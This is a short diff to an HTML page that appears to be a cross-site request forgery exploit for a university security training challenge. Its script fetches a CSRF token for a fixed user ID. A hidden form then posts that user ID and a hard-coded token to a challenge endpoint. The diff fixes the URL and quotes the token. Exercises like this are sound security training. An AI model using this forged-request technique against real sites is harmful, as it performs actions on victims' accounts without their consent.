@@ -7,7 +7,7 @@
   <script> 
     var xhr = new XMLHttpRequest();
     console.log("getting token...")
-    xhr.open("GET", "https://snickerboa.it.liu.se/user/csrfchallengeseven/getToken?userId=9460e602519f36d858ac6bda083d9de3587ee33e?callback=some_func", false);
+    xhr.open("GET", "https://snickerboa.it.liu.se/user/csrfchallengeseven/getToken?userId=9460e602519f36d858ac6bda083d9de3587ee33e", false);
     xhr.send();
     if(xhr.readyState == 4 && xhr.status == 200) {
      console.log(xhr.responseText)
@@ -21,7 +21,7 @@
 
   <form name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengesix/plusplus" method="POST">
     <input type="hidden" name="userId" value="9460e602519f36d858ac6bda083d9de3587ee33e" />
-    <input type="hidden" name="csrfToken" value=eccbc87e4b5ce2fe28308fd9f2a7baf3 />
+    <input type="hidden" name="csrfToken" value="eccbc87e4b5ce2fe28308fd9f2a7baf3" />
     <input type="submit"/>
   </form>
   <script>
